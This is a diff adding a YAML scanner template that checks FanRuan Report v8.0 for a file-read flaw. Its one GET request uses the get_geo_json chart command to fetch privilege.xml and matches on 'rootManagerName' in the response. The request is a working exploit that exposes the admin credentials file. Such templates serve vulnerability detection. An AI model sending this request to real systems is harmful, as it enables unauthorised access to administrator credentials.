@@ -1,0 +1,13 @@
+name: 帆软报表-v8.0-文件读取
+description: >
+  读取敏感文件
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    expression:
+      status: 200
+      body_all:
+        - "rootManagerName"
+        - "CDATA"
